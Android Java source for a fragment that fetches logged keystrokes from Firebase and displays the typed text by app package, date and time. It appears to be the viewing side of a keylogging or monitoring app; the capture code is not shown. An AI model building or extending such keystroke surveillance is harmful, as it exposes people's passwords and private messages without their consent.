package com.vikasyadavnsit.cdc.fragment;

import android.app.Activity;
import android.graphics.Typeface;
import android.os.Bundle;
import android.util.DisplayMetrics;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.GridLayout;
import android.widget.LinearLayout;
import android.widget.Spinner;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

import com.vikasyadavnsit.cdc.R;
import com.vikasyadavnsit.cdc.data.KeyStrokeData;
import com.vikasyadavnsit.cdc.data.SpinnerItem;
import com.vikasyadavnsit.cdc.utils.CommonUtil;
import com.vikasyadavnsit.cdc.utils.FirebaseUtils;

import java.time.LocalDate;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.TreeSet;

public class KeyStrokesFragment extends Fragment {

    private static GridLayout fragmentLayout;
    private static Spinner dropdownSpinner;
    private static ArrayAdapter<SpinnerItem> spinnerArrayAdapter;

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater,
                             @Nullable ViewGroup container,
                             @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_key_strokes, container, false);
        fragmentLayout = view.findViewById(R.id.keystrokes_fragment_layout);
        dropdownSpinner = view.findViewById(R.id.keystrokes_fragment_dropdown_spinner);
        fragmentLayout.setColumnCount(calculateNoOfColumns());
        CommonUtil.showLoader();
        FirebaseUtils.getAndroidUserKeystrokes();
        return view;
    }

    private int calculateNoOfColumns() {
        DisplayMetrics dm = getResources().getDisplayMetrics();
        float dpWidth = dm.widthPixels / dm.density;
        return Math.max(1, Math.min((int) (dpWidth / 300), 3));
    }

    public static void displayKeyStrokes(Activity activity, Map<String, KeyStrokeData> keyStrokeDataMap) {
        TreeSet<String> uniqueAppPackages = new TreeSet<>();
        for (KeyStrokeData data : keyStrokeDataMap.values()) {
            if (data != null && data.getAppPackage() != null) {
                uniqueAppPackages.add(data.getAppPackage());
            }
        }
        initializeSpinner(activity, uniqueAppPackages);
        setupSpinnerListener(activity, keyStrokeDataMap);
        CommonUtil.hideLoader();
    }

    private static void initializeSpinner(Activity activity, TreeSet<String> uniqueAppPackages) {
        SpinnerItem[] items = new SpinnerItem[uniqueAppPackages.size() + 2];
        items[0] = new SpinnerItem("Select an application", null);
        items[1] = new SpinnerItem("Show all apps data", null);
        int index = 2;
        for (String appPackage : uniqueAppPackages) {
            items[index++] = new SpinnerItem(appPackage, null);
        }
        spinnerArrayAdapter = new ArrayAdapter<>(activity, android.R.layout.simple_spinner_item, items);
        spinnerArrayAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        dropdownSpinner.setAdapter(spinnerArrayAdapter);
    }

    private static void setupSpinnerListener(Activity activity, Map<String, KeyStrokeData> keyStrokeDataMap) {
        dropdownSpinner.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {
            @Override
            public void onItemSelected(AdapterView<?> parent, View view, int position, long id) {
                fragmentLayout.removeAllViews();
                if (position == 0) {
                    // placeholder — do nothing
                } else if (position == 1) {
                    displayAllAppsData(activity, keyStrokeDataMap);
                } else {
                    displaySelectedAppData(activity, keyStrokeDataMap,
                            (SpinnerItem) parent.getItemAtPosition(position));
                }
            }

            @Override
            public void onNothingSelected(AdapterView<?> parent) {
            }
        });
    }

    private static void displayAllAppsData(Activity activity, Map<String, KeyStrokeData> keyStrokeDataMap) {
        Map<String, List<KeyStrokeData>> groupedData = groupDataByDate(keyStrokeDataMap);
        for (Map.Entry<String, List<KeyStrokeData>> entry : groupedData.entrySet()) {
            LinearLayout group = createGroupLayout(activity, entry.getKey());
            for (KeyStrokeData ks : entry.getValue()) {
                addKeystrokeRow(group, ks);
            }
            fragmentLayout.addView(group);
        }
    }

    private static void displaySelectedAppData(Activity activity,
                                                Map<String, KeyStrokeData> keyStrokeDataMap,
                                                SpinnerItem selectedItem) {
        String selectedPackage = selectedItem.getLabel();
        Map<LocalDate, List<KeyStrokeData>> grouped = new HashMap<>();
        keyStrokeDataMap.values().stream()
                .filter(d -> d.getAppPackage().equals(selectedPackage))
                .forEach(d -> {
                    LocalDate date = LocalDateTime.parse(d.getTimestamp()).toLocalDate();
                    grouped.computeIfAbsent(date, k -> new ArrayList<>()).add(d);
                });
        List<LocalDate> sortedDates = new ArrayList<>(grouped.keySet());
        sortedDates.sort((a, b) -> b.compareTo(a));
        for (LocalDate date : sortedDates) {
            LinearLayout group = createGroupLayout(activity, date.toString());
            for (KeyStrokeData ks : grouped.get(date)) {
                addKeystrokeRow(group, ks);
            }
            fragmentLayout.addView(group);
        }
    }

    private static Map<String, List<KeyStrokeData>> groupDataByDate(Map<String, KeyStrokeData> map) {
        Map<LocalDate, List<KeyStrokeData>> grouped = new HashMap<>();
        map.values().forEach(ks -> {
            LocalDate date = LocalDateTime.parse(ks.getTimestamp()).toLocalDate();
            grouped.computeIfAbsent(date, k -> new ArrayList<>()).add(ks);
        });
        List<LocalDate> sortedKeys = new ArrayList<>(grouped.keySet());
        sortedKeys.sort(Comparator.reverseOrder());
        Map<String, List<KeyStrokeData>> sorted = new LinkedHashMap<>();
        for (LocalDate key : sortedKeys) sorted.put(key.toString(), grouped.get(key));
        return sorted;
    }

    private static LinearLayout createGroupLayout(Activity activity, String dateText) {
        float density = activity.getResources().getDisplayMetrics().density;
        LinearLayout group = new LinearLayout(activity);
        group.setOrientation(LinearLayout.VERTICAL);
        group.setBackgroundResource(R.drawable.group_border);
        int pad = dp(16, density);
        group.setPadding(pad, pad, pad, pad);

        GridLayout.LayoutParams p = new GridLayout.LayoutParams();
        p.width = 0;
        p.height = GridLayout.LayoutParams.WRAP_CONTENT;
        p.columnSpec = GridLayout.spec(GridLayout.UNDEFINED, 1f);
        p.setMargins(dp(8, density), dp(8, density), dp(8, density), dp(8, density));
        group.setLayoutParams(p);

        TextView header = new TextView(activity);
        header.setText(dateText);
        header.setTextColor(activity.getColor(R.color.text_primary));
        header.setTextSize(14f);
        header.setTypeface(null, Typeface.BOLD);
        LinearLayout.LayoutParams hp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        hp.setMargins(0, 0, 0, dp(8, density));
        header.setLayoutParams(hp);
        group.addView(header);

        View divider = new View(activity);
        divider.setBackgroundColor(activity.getColor(R.color.divider));
        LinearLayout.LayoutParams dp2 = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 1);
        dp2.setMargins(0, 0, 0, dp(8, density));
        divider.setLayoutParams(dp2);
        group.addView(divider);

        return group;
    }

    private static void addKeystrokeRow(LinearLayout group, KeyStrokeData ks) {
        Activity activity = (Activity) group.getContext();
        String time = LocalDateTime.parse(ks.getTimestamp())
                .format(DateTimeFormatter.ofPattern("HH:mm:ss"));
        TextView tv = new TextView(activity);
        tv.setText(time + "  —  " + ks.getText());
        tv.setTextColor(activity.getColor(R.color.text_secondary));
        tv.setTextSize(12f);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        lp.setMargins(0, dp(4, activity.getResources().getDisplayMetrics().density), 0, 0);
        tv.setLayoutParams(lp);
        group.addView(tv);
    }

    private static int dp(int v, float density) {
        return (int) (v * density);
    }
}
